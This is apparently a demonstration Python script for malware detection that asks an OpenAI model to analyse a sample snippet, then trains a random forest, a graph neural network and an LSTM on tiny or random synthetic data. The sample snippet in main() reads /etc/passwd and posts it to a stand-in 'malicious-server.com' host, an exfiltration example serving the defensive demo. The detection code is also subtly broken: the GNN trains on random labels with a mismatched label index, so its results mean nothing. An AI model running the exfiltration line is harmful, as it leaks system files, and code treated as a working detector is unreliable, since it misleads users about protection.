import openai
import pandas as pd
import torch
import torch.nn.functional as F
from torch_geometric.nn import GCNConv
from torch_geometric.data import Data, DataLoader
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense
import numpy as np
import random
import os
import requests

# OpenAI API key
openai.api_key = 'YOUR_OPENAI_API_KEY'

# 1. Code Snippet Analysis with OpenAI
def analyze_code_with_chatgpt(code_snippet):
    prompt = {
        "model": "gpt-3.5-turbo",
        "messages": [
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": f"Please analyze the following code snippet for any suspicious or malicious behavior:\n\n{code_snippet}\n\nWhat can you infer from this code?"}
        ]
    }
    
    response = openai.ChatCompletion.create(**prompt)
    return response.choices[0].message['content'].strip()

# 2. Random Forest Classifier for Executable File Data
def random_forest_classifier():
    # Simulated executable file data (for demonstration purposes)
    data = {
        'File Size': [2000, 2200, 2500, 2750, 8000, 8588, 9000, 9500],
        'Num Sections': [3, 3, 4, 4, 8, 8, 9, 9],
        'Entropy': [6.5, 6.6, 6.7, 6.8, 7.5, 7.6, 7.7, 7.8],
        'Suspicious_APIs': [0, 1, 0, 1, 5, 6, 5 , 6],
        'Is Malware': [0, 0, 0, 0, 1, 1, 1, 1] # 0 for benign, 1 for malware
    }
    
    df = pd.DataFrame(data)
    X = df[['File Size', 'Num Sections', 'Entropy', 'Suspicious_APIs']]
    y = df['Is Malware']
    
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
    clf = RandomForestClassifier(n_estimators=50)
    clf.fit(X_train, y_train)
    
    y_pred = clf.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)
    print(f"Random Forest Accuracy: {accuracy * 100}%")
    print("Classification Report:", classification_report(y_test, y_pred))

# 3. Graph Neural Network (GNN) Model for Malware Detection
def gnn_malware_detection():
    def generate_CFG(binary_path, num_samples=1000):
        data_list = []
        for _ in range(num_samples):
            num_nodes = random.randint(5, 20)
            nodes = torch.randn((num_nodes, 2))
            edges = torch.randint(0, num_nodes, (2, random.randint(num_nodes - 1, num_nodes)))
            label = torch.tensor([random.randint(0, 1)], dtype=torch.long)
            data = Data(x=nodes, edge_index=edges, y=label)
            data_list.append(data)
        return data_list
    
    class GNNModel(torch.nn.Module):
        def __init__(self):
            super(GNNModel, self).__init__()
            self.conv1 = GCNConv(2, 16)
            self.conv2 = GCNConv(16, 2)
        
        def forward(self, data):
            x, edge_index = data.x, data.edge_index
            x = self.conv1(x, edge_index)
            x = F.relu(x)
            x = F.dropout(x, training=self.training)
            x = self.conv2(x, edge_index)
            return F.log_softmax(x, dim=1)

    dataset = generate_CFG("path_to_malware_binary")
    loader = DataLoader(dataset, batch_size=32, shuffle=True)
    
    model = GNNModel()
    optimizer = torch.optim.Adam(model.parameters(), lr=0.01)
    model.train()
    
    for epoch in range(100):
        for data in loader:
            optimizer.zero_grad()
            out = model(data)
            y_true = data.y[data.batch]
            loss = F.nll_loss(out, y_true)
            loss.backward()
            optimizer.step()

    # Inference
    model.eval()
    sample_data = dataset[0]
    out = model(sample_data)
    pred = out.max(dim=1)[1]
    
    if pred[0].item() == 1:
        print("The first node in the binary is detected as metamorphic malware!")
    else:
        print("The first node in the binary is benign.")

# 4. LSTM for Memory Dump Classification
def lstm_memory_dump_classifier():
    X = np.array([
        [200, 50, 2, 5, 1, 0, 1, 2, 8, 8, 0],  # benign
        [220, 55, 2, 4, 1, 0, 1, 2, 0, 0, 0],  # benign
        [500, 200, 10, 20, 5, 2, 3, 5, 2, 1, 1],  # malicious
        [210, 52, 2, 5, 1, 0, 1, 2, 0, 0, 0],  # benign
        [488, 190, 9, 18, 4, 2, 3, 4, 2, 1, 1],  # malicious
    ])
    
    y = np.array([0, 0, 1, 0, 1])  # 0 for benign, 1 for malicious
    
    X = np.reshape(X, (X.shape[0], 1, X.shape[1]))
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
    
    model = Sequential()
    model.add(LSTM(50, input_shape=(X_train.shape[1], X_train.shape[2])))
    model.add(Dense(1, activation='sigmoid'))
    
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    model.fit(X_train, y_train, epochs=50, batch_size=1)
    
    y_pred = (model.predict(X_test) > 0.5).astype("int32")
    print("LSTM Accuracy:", accuracy_score(y_test, y_pred))
    print("Classification Report:", classification_report(y_test, y_pred))

# Main function to call each part
def main():
    # Example 1: Analyze code for suspicious behavior
    code_snippet = """
    def suspicious_function():
        import os
        user_data = os.environ.get('USER_DATA')
        if os.path.exists('/etc/passwd'):
            with open('/etc/passwd', 'r') as file:
                content = file.read()
            requests.post('http://malicious-server.com/upload', data=content)
        print("This is a test function.")
    """
    analysis_result = analyze_code_with_chatgpt(code_snippet)
    print("Code Analysis:", analysis_result)
    
    # Example 2: Random Forest Classifier for executable file data
    random_forest_classifier()
    
    # Example 3: Graph Neural Network for malware detection
    gnn_malware_detection()
    
    # Example 4: LSTM for memory dump classification
    lstm_memory_dump_classifier()

if __name__ == "__main__":
    main()
